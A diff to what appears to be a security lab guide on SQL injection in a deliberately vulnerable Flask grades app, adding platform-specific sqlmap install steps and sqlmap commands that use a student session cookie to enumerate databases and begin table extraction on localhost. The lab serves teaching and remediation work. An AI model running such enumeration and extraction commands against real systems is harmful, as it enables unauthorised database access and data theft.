@@ -19,12 +19,28 @@ SQL injection is present in the login form, the grades search endpoint, and the 
 | MySQL CLI | Verify database state and confirm exploitation results |
 | Flask source code | Implement parameterized query remediation |
 
-**Install sqlmap:**
+### Installing sqlmap by Platform
+
+**macOS:**
 ```bash
-pip install sqlmap
-# or
 brew install sqlmap
+# or
+pip3 install sqlmap
 ```
+
+**Linux:**
+```bash
+pip3 install sqlmap
+# or
+sudo apt install sqlmap
+```
+
+**Windows:**
+```powershell
+pip install sqlmap
+```
+
+> After installation, verify with `sqlmap --version`. On Windows, if `sqlmap` is not found after install, try `python -m sqlmap --version` or run it via Git Bash.
 
 ---
 
@@ -108,6 +124,20 @@ Document whether additional records are returned beyond the current user's enrol
 
 Run sqlmap against the grades endpoint using your authenticated session cookie:
 
+**macOS / Linux:**
+```bash
+sqlmap -u "http://localhost/grades?student_id=3&search=info" \
+  --cookie="authenticated=jsmith; role=student; user_id=3" \
+  --dbs \
+  --batch
+```
+
+**Windows (PowerShell):**
+```powershell
+sqlmap -u "http://localhost/grades?student_id=3&search=info" --cookie="authenticated=jsmith; role=student; user_id=3" --dbs --batch
+```
+
+**Windows (Git Bash):**
 ```bash
 sqlmap -u "http://localhost/grades?student_id=3&search=info" \
   --cookie="authenticated=jsmith; role=student; user_id=3" \
@@ -121,6 +151,7 @@ Record every database sqlmap identifies.
 
 ### 7. Use sqlmap — Table and Data Extraction
 
+**macOS / Linux / Git Bash:**
 ```bash
 # List tables
 sqlmap -u "http://localhost/grades?student_id=3&search=info" \
